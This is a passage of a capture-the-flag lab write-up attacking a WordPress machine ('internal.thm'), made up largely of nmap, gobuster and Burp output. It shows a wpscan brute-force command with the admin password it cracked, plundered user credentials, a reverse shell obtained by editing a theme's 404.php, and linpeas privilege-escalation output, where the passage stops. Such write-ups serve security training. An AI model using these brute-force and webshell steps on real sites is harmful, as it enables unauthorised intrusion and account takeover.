Internal ----------------------> 20/1/2021

'''

export ip=10.10.198.28


'''

'''

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt
Root.txt
Additionally, the client has provided the following scope allowances:

Ensure that you modify your hosts file to reflect internal.thm
Any tools or techniques are permitted in this engagement
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
Only the IP address assigned to your machine is in scope
(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.



Note - this room can be completed without Metasploit

'''
Manual Recon of the target

'''


NetRange:       10.0.0.0 - 10.255.255.255
CIDR:           10.0.0.0/8
NetName:        PRIVATE-ADDRESS-ABLK-RFC1918-IANA-RESERVED
NetHandle:      NET-10-0-0-0-1
Parent:          ()
NetType:        IANA Special Use
OriginAS:       
Organization:   Internet Assigned Numbers Authority (IANA)
RegDate:        
Updated:        2013-08-30
Comment:        These addresses are in use by many millions of independently operated networks, which might be as small as a single computer connected to a home gateway, and are automatically configured in hundreds of millions of devices.  They are only intended for use within a private context  and traffic that needs to cross the Internet will need to use a different, unique address.
Comment:        
Comment:        These addresses can be used by anyone without any need to coordinate with IANA or an Internet registry.  The traffic from these addresses does not come from ICANN or IANA.  We are not the source of activity you may see on logs or in e-mail records.  Please refer to http://www.iana.org/abuse/answers
Comment:        
Comment:        These addresses were assigned by the IETF, the organization that develops Internet protocols, in the Best Current Practice document, RFC 1918 which can be found at:
Comment:        http://datatracker.ietf.org/doc/rfc1918
Ref:            https://rdap.arin.net/registry/ip/10.0.0.0



OrgName:        Internet Assigned Numbers Authority
OrgId:          IANA
Address:        12025 Waterfront Drive
Address:        Suite 300
City:           Los Angeles
StateProv:      CA
PostalCode:     90292
Country:        US
RegDate:        
Updated:        2012-08-31
Ref:            https://rdap.arin.net/registry/entity/IANA


OrgAbuseHandle: IANA-IP-ARIN
OrgAbuseName:   ICANN
OrgAbusePhone:  +1-310-301-5820 
OrgAbuseEmail:  abuse@iana.org
OrgAbuseRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN

OrgTechHandle: IANA-IP-ARIN
OrgTechName:   ICANN
OrgTechPhone:  +1-310-301-5820 
OrgTechEmail:  abuse@iana.org
OrgTechRef:    https://rdap.arin.net/registry/entity/IANA-IP-ARIN



'''

'''
; <<>> DiG 9.16.8-Debian <<>> a 10.10.239.151
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 48272
;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;10.10.239.151.			IN	A

;; ANSWER SECTION:
10.10.239.151.		0	IN	A	10.10.239.151

;; Query time: 0 msec
;; SERVER: 192.168.29.1#53(192.168.29.1)
;; WHEN: Thu Jan 21 11:41:45 IST 2021
;; MSG SIZE  rcvd: 47



Nothing found when quering about zone transfer records.


'''

Nmap Initial Scan

'''
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 11:58 IST
Nmap scan report for 10.10.239.151
Host is up (0.42s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/21%OT=22%CT=1%CU=35275%PV=Y%DS=4%DC=T%G=Y%TM=60091F2
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   279.17 ms 10.2.0.1
2   ... 3
4   420.24 ms 10.10.239.151


'''
As I can check only two port is available after an active reconnaissance lets try little more stealthy scan

'''
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 12:12 IST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 12:12
Scanning 10.10.239.151 [4 ports]
Completed Ping Scan at 12:12, 0.46s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:12
Completed Parallel DNS resolution of 1 host. at 12:12, 0.04s elapsed
Initiating SYN Stealth Scan at 12:12
Scanning 10.10.239.151 [1000 ports]
Discovered open port 22/tcp on 10.10.239.151
Discovered open port 80/tcp on 10.10.239.151
Completed SYN Stealth Scan at 12:12, 4.06s elapsed (1000 total ports)
Initiating Service scan at 12:12
Scanning 2 services on 10.10.239.151
Completed Service scan at 12:12, 6.84s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.239.151.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 12:12
Completed NSE at 12:12, 1.73s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 12:12
Completed NSE at 12:12, 1.66s elapsed
Nmap scan report for 10.10.239.151
Host is up, received reset ttl 61 (0.42s latency).
Scanned at 2021-01-21 12:12:22 IST for 15s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


'''
As you can see stealthy post scans could show only two active ports available but intresting twist is at port 80 when i check at 10.10.239.151:80 

'''
"Apache2 Ubuntu Default Page" from here i guess we might have default credentials access we can run a probable directory scan

gobuster dir -u http://$ip:80/ -w ~/payloadList/directory.txt -x php,sh,py,txt,js,html,css,cgi -o gobuster/directoryScan.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.239.151:80/
[+] Threads:        10
[+] Wordlist:       /home/pranay/payloadList/directory.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     js,html,css,cgi,php,sh,py,txt
[+] Timeout:        10s
===============================================================
2021/01/21 12:24:31 Starting gobuster
===============================================================
/index.html (Status: 200)
/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)


Let's check out these directory

http://10.10.239.151/blog/ 
at this directory i found out that this is a wordpress site which is still under construction but available on the internet. Fishy it is...


'''

UDP active port scanning

'''

Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 10:08 IST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 10:08
Scanning 10.10.167.97 [4 ports]
Completed Ping Scan at 10:08, 0.47s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:08
Completed Parallel DNS resolution of 1 host. at 10:08, 0.06s elapsed
Initiating UDP Scan at 10:08
Scanning 10.10.167.97 [1000 ports]
Increasing send delay for 10.10.167.97 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.167.97 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.167.97 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.167.97 from 200 to 400 due to max_successful_tryno increase to 7
UDP Scan Timing: About 4.40% done; ETC: 10:19 (0:11:14 remaining)
Increasing send delay for 10.10.167.97 from 400 to 800 due to 11 out of 25 dropped probes since last increase.
UDP Scan Timing: About 7.69% done; ETC: 10:21 (0:12:12 remaining)
Increasing send delay for 10.10.167.97 from 800 to 1000 due to max_successful_tryno increase to 8
UDP Scan Timing: About 18.93% done; ETC: 10:23 (0:12:55 remaining)
UDP Scan Timing: About 26.56% done; ETC: 10:24 (0:12:04 remaining)
UDP Scan Timing: About 36.92% done; ETC: 10:25 (0:11:13 remaining)
UDP Scan Timing: About 41.72% done; ETC: 10:25 (0:10:17 remaining)
UDP Scan Timing: About 46.52% done; ETC: 10:25 (0:09:23 remaining)
Stats: 0:08:20 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 47.51% done; ETC: 10:25 (0:09:12 remaining)
UDP Scan Timing: About 52.62% done; ETC: 10:25 (0:08:16 remaining)
UDP Scan Timing: About 57.72% done; ETC: 10:25 (0:07:21 remaining)
UDP Scan Timing: About 62.82% done; ETC: 10:25 (0:06:26 remaining)
UDP Scan Timing: About 67.92% done; ETC: 10:25 (0:05:33 remaining)
UDP Scan Timing: About 73.02% done; ETC: 10:25 (0:04:39 remaining)
UDP Scan Timing: About 78.12% done; ETC: 10:25 (0:03:46 remaining)
UDP Scan Timing: About 83.22% done; ETC: 10:25 (0:02:53 remaining)
UDP Scan Timing: About 88.32% done; ETC: 10:25 (0:02:00 remaining)
UDP Scan Timing: About 93.42% done; ETC: 10:25 (0:01:08 remaining)
Completed UDP Scan at 10:25, 1039.98s elapsed (1000 total ports)
Initiating Service scan at 10:25
Scanning 2 services on 10.10.167.97
Stats: 0:18:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 10:27 (0:00:58 remaining)
Completed Service scan at 10:26, 97.58s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.167.97
Retrying OS detection (try #2) against 10.10.167.97
NSE: Script scanning 10.10.167.97.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 0.02s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 10:27
Completed NSE at 10:27, 1.58s elapsed
Nmap scan report for 10.10.167.97
Host is up, received timestamp-reply ttl 61 (0.39s latency).
Scanned at 2021-01-22 10:08:01 IST for 1142s
Not shown: 998 closed ports
Reason: 998 port-unreaches
PORT     STATE         SERVICE REASON      VERSION
68/udp   open|filtered dhcpc   no-response
5555/udp open|filtered rplay   no-response
Too many fingerprints match this host to give specific OS details
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/22%OT=%CT=%CU=2%PV=Y%DS=4%DC=I%G=N%TM=600A5B1F%P=x86_64-pc-linux-gnu)
SEQ(CI=Z%II=I)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

As from here we can check udp port 5555 & 68 is open & filtered. I went through the source code available at the client side whic doesn't show any clue so that we could exploit.. 

'''
Let's try burpesuit if we could find any possible way to exploit it.

'''

GET /blog/wp-login.php HTTP/1.1
Host: internal.thm
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.167.97/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close

POST /blog/wp-login.php HTTP/1.1
Host: internal.thm
Content-Length: 108
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://internal.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://internal.thm/blog/wp-login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close

log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1

Hhhmm......tough situation now...

'''
Well if we see few things i have increased likeness for testcookie at GET and the POST is more hacker friendly..so its LOVE.


'''

-----------------------------Request: set wordpress_test_cookie only on login screen----------------------------------
As per evidence by GET we do have a wordpress_test_cookie on the login screen but we yeh have no idea if any of its components are using the same cookie????
let's check it out...

Found out few intresting things on the Internet

CVE-2008-1930: Wordpress 2.5 Cookie Integrity Protection Vulnerability
This exercise explains how you can exploit CVE-2008-1930 to gain access to the administration interface of a Wordpress installation.



I remember i have one wordpress folder during my directory scan...

'Source_Code_Piece'
<form name="loginform" id="loginform" action="http://internal.thm/blog/wp-login.php" method="post">
			<p>
				<label for="user_login">Username or Email Address</label>
				<input type="text" name="log" id="user_login" aria-describedby="login_error" class="input" value="admin" size="20" autocapitalize="off" />
			</p>
'---------------------------'

Tried alot with burpesuite but the sample of information is great but doesn't work fine for me maybe i need to try some more techniques-----will get back to it if the 
possible other piece of information doesnt work. 

The for which above information isn't working because the client side filter has great filtering process and i am not able to create any admin user account but here i guess the problem is with the amount of 
information of wordpress directory listing and its triggering techniques might cause possible harm let's try this out..

'''



'''

https://pentesterlab.com/exercises/cve-2008-1930/course

at this vulnerability page found out the we can trigger with some parameters.

http://vulnerable/wp-login.php?action=register

and from one of the page http://internal.thm/blog/index.php/feed/

I found out some information retated to directories. 

<generator>https://wordpress.org/?v=5.4.2</generator>
	<item>
		<title>Hello world!</title>
		<link>http://internal.thm/blog/index.php/2020/08/03/hello-world/</link>
					<comments>http://internal.thm/blog/index.php/2020/08/03/hello-world/#comments</comments>
		
		<dc:creator><![CDATA[admin]]></dc:creator>
		<pubDate>Mon, 03 Aug 2020 13:19:02 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">http://192.168.1.45/blog/?p=1</guid>

					<description><![CDATA[Welcome to WordPress. This is your first post. Edit or delete it, then start writing!]]></description>
										<content:encoded><![CDATA[
<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>
]]></content:encoded>
					
					<wfw:commentRss>http://internal.thm/blog/index.php/2020/08/03/hello-world/feed/</wfw:commentRss>
			<slash:comments>1</slash:comments>
		
		
			</item>

This information might be useful to us.

<guid isPermaLink="false">http://192.168.1.45/blog/?p=1</guid>

'''

I tried few parameters

'''

http://internal.thm/blog/?action=register

....but same no result 

then i tried 

http://internal.thm/blog/?p=1

it lead me to 

http://internal.thm/blog/index.php/2020/08/03/hello-world/

This above page has the same wordpress_test_cookie 

GET /blog/index.php/2020/08/03/hello-world/ HTTP/1.1
Host: internal.thm
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: wordpress_test_cookie=WP+Cookie+check
Connection: close

May be the comments plugins uses these kind of user cookies to Authenticate User------------Intresting...

Let's check for plugins details and how can we crack it to get an duplicate access..


'''

Let's Check the exploit now it was also related to comments plugin

'''
I cannot possibly make any user account so this vuln is really getting out my context. But we will try if we get any further clue

Version Of WordPress
http://internal.thm/blog/wp-includes/js/wp-embed.min.js?ver=5.4.2



'''
Manually i guess things are little difficult but we still got a tool wpscan

'''

wpscan --url http://$ip/blog --usernames admin --passwords ~/payloadList/rockyou.txt --max-threads 10
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.12
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.213/blog/ [10.10.10.213]
[+] Started: Sat Jan 23 12:57:18 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.213/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.10.213/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.213/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.213/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.213/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <=========================================================================================================================> (22 / 22) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                           
Trying admin / ricky1 Time: 00:06:51 <                                                                                                                       > (3890 / 14348282)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Jan 23 13:04:34 2021
[+] Requests Done: 3937
[+] Cached Requests: 4
[+] Data Sent: 2.015 MB
[+] Data Received: 2.417 MB
[+] Memory used: 233.758 MB
[+] Elapsed time: 00:07:16


'''

'''

As we have got the password of my2boys....Interesting isn't it...
let's try it then....


And here we get into the dashboard.......LMAO..noob..me


'''

Lets check out the feature if by any case we can upload or execute anything to get back a reverse shell

Here in of of the post users deatils like username and passwords are revealed..

william:arnold147

but its not logging into the wordpress domain..Interesting..





'''

In the appearance plugin of in the theme edits section I got to know we have one default naming convention

/**
 * Twenty Seventeen functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since Twenty Seventeen 1.0
 */

/**
 * Twenty Seventeen only works in WordPress 4.7 or later.
 */


/*
	 * Make theme available for translation.
	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentyseventeen
	 * If you're building a theme based on Twenty Seventeen, use a find and replace
	 * to change 'twentyseventeen' to the name of your theme in all the template files.
	 */


It is not uploadable in the form of php . 

'''

But I have probably edited the 404.php page to get back a reverse shell and if you ask me how i got it..is when i did the above peice of recon
i stumblled upon..this link.



'''
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

amazing and we do go an reverse shell at port 1234
tcp        0      0 10.2.59.217:1234        10.10.10.213:46228      ESTABLISHED 7234/nc             


'''

This is time now to do some priviledge escalation..


'''

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMangeta: Your username


====================================( Basic information )=====================================
OS: Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: internal
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . DONE
====================================( System Information )====================================
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.15.0-112-generic (buildd@lcy01-amd64-027) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.4 LTS
Release:	18.04
Codename:	bionic

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.21p2

[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation

[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Date
Sat Jan 23 09:01:11 UTC 2021

[+] System stats
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  8.8G  5.6G  2.8G  68% /
udev                               965M     0  965M   0% /dev
tmpfs                              996M     0  996M   0% /dev/shm
tmpfs                              200M  960K  199M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              996M     0  996M   0% /sys/fs/cgroup
/dev/loop0                          97M   97M     0 100% /snap/core/9665
/dev/loop1                          90M   90M     0 100% /snap/core/8268
/dev/xvda2                         976M   77M  832M   9% /boot
              total        used        free      shared  buff/cache   available
Mem:        2038996      659856      316452       22908     1062688     1171436
Swap:             0           0           0

[+] CPU info
Architecture:        x86_64
CPU op-mode(s):      32-bit, 64-bit
Byte Order:          Little Endian
CPU(s):              1
On-line CPU(s) list: 0
Thread(s) per core:  1
Core(s) per socket:  1
Socket(s):           1
NUMA node(s):        1
Vendor ID:           GenuineIntel
CPU family:          6
Model:               79
Model name:          Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz
Stepping:            1
CPU MHz:             2300.078
BogoMIPS:            4600.17
Hypervisor vendor:   Xen
Virtualization type: full
L1d cache:           32K
L1i cache:           32K
L2 cache:            256K
L3 cache:            46080K
NUMA node0 CPU(s):   0
Flags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm cpuid_fault invpcid_single pti fsgsbase bmi1 avx2 smep bmi2 erms invpcid xsaveopt

[+] Environment
[i] Any private information inside environment variables?
HISTFILESIZE=0
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:21108
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=452b5b3cc8234fac9cf426eb8f0b5868
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
HISTFILE=/dev/null

[+] Searching Signature verification failed in dmseg
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
 Not Found

[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
[+] grsecurity present? ............ grsecurity Not Found
[+] PaX bins present? .............. PaX Not Found
[+] Execshield enabled? ............ Execshield Not Found
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (xen)
[+] Is this a container? ........... No
[+] Any running containers? ........ No


=========================================( Devices )==========================================
[+] Any sd*/disk* disk in /dev? (limit 20)
disk

[+] Unmounted file-system?
[i] Check if you can mount umounted devices
/dev/disk/by-id/dm-uuid-LVM-52w2tUsocjutoPr2I8CTg9eGK9D6FcRD1qyBSmjOrmXfByioL4bKVnan7ohqpSHM	/	ext4	defaults	0 0
/dev/disk/by-uuid/1be66c6f-6666-43a1-9900-68bbf4c30971	/boot	ext4	defaults	0 0


====================================( Available Software )====================================
[+] Useful software
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/bin/curl
/bin/ping
/usr/bin/base64
/usr/bin/python
/usr/bin/python2
/usr/bin/python3
/usr/bin/python2.7
/usr/bin/python3.6
/usr/bin/perl
/usr/bin/php
/usr/bin/sudo
/usr/bin/docker
/usr/bin/lxc
/usr/bin/ctr
/usr/sbin/runc

[+] Installed Compiler
/snap/core/8268/usr/share/gcc-5
/snap/core/9665/usr/share/gcc-5
/usr/share/gcc-8


================================( Processes, Cron, Services, Timers & Sockets )================================
[+] Cleaned processes
[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
root         1  0.0  0.4 159844  9100 ?        Ss   04:45   0:04 /sbin/init maybe-ubiquity
root       420  0.0  0.8 103012 17992 ?        S<s  04:46   0:00 /lib/systemd/systemd-journald
root       427  0.0  0.0 105904  1768 ?        Ss   04:46   0:00 /sbin/lvmetad -f
root       436  0.0  0.2  45436  4332 ?        Ss   04:46   0:00 /lib/systemd/systemd-udevd
systemd+   607  0.0  0.1 141956  3192 ?        Ssl  04:46   0:00 /lib/systemd/systemd-timesyncd
    |--(Caps) 0x0000000002000000=cap_sys_time
systemd+   742  0.0  0.2  80080  5292 ?        Ss   04:46   0:00 /lib/systemd/systemd-networkd
    |--(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   765  0.0  0.3  70792  6264 ?        Ss   04:46   0:00 /lib/systemd/systemd-resolved
root       879  0.0  0.3 286452  6780 ?        Ssl  04:46   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       884  0.0  0.8 169188 17068 ?        Ssl  04:46   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon[0m     890  0.0  0.1  28332  2376 ?        Ss   04:46   0:00 /usr/sbin/atd -f
syslog     894  0.0  0.2 263036  4420 ?        Ssl  04:46   0:00 /usr/sbin/rsyslogd -n
message+   905  0.0  0.2  50148  4680 ?        Ss   04:46   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
    |--(Caps) 0x0000000020000000=cap_audit_write
root       919  0.0  0.2  62144  5748 ?        Ss   04:46   0:00 /lib/systemd/systemd-logind
root       920  0.0  0.1 636976  2720 ?        Ssl  04:46   0:03 /usr/bin/lxcfs /var/lib/lxcfs/
root       921  0.0  1.3 636668 27524 ?        Ssl  04:46   0:01 /usr/lib/snapd/snapd
